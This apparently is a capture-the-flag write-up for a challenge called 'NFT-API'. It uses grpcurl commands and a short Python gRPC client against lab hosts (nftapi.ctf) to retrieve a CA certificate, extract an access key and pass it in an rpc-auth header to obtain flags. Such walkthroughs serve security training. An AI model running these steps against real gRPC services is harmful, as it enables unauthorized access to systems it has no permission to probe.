# NFT-API

## First part

First, we needed to fetch a Certificate Authority from the Chanterelle gRPC server. To do so, we used `grpcurl`, with the following command:

```bash
$ grpcurl --proto ./chanterelle/chanterelle.proto --plaintext nftapi.ctf:50052 Chanterelle.CAPrinter > out
```

This gave us the flag and the CA certificate, which could be seen like this:
```bash
$ cat out | jq .flag
<flag>
$ cat out | jq .ca
<ca cert>
```

:triangular_flag_on_post:


## Second part

Now that we have the CA, we can communicate with Morel's gRPC server. Using the following command, we were able to extract an access key to be used later on:

``` bash
❯ grpcurl --proto ./morel/morel.proto --insecure --cacert ./ca -expand-headers -rpc-header "rpc-auth: {s.access_key}" nftapi.ctf:50053 Morel.AuthenticationValidator
<access_key>
```

Then, using this python script, we were able to get the flag from the gRPC response:

```py
import grpc
import morel_pb2_grpc
import morel_pb2

def client():
  with open('ca.crt', 'rb') as f:
    ca_cert = f.read()
  credentials = grpc.ssl_channel_credentials(ca_cert)
  with grpc.secure_channel('nftapi.ctf:50053', credentials) as channel:
    stub = morel_pb2_grpc.MorelStub(channel)
    request = morel_pb2.AuthenticationAnswer()
    response = stub.AuthenticationValidator(request=request, metadata=(('rpc-auth', '<access_key_here>'),))
    print(response) # Flag is printed here

if __name__ == '__main__':
  client()
```

:triangular_flag_on_post: 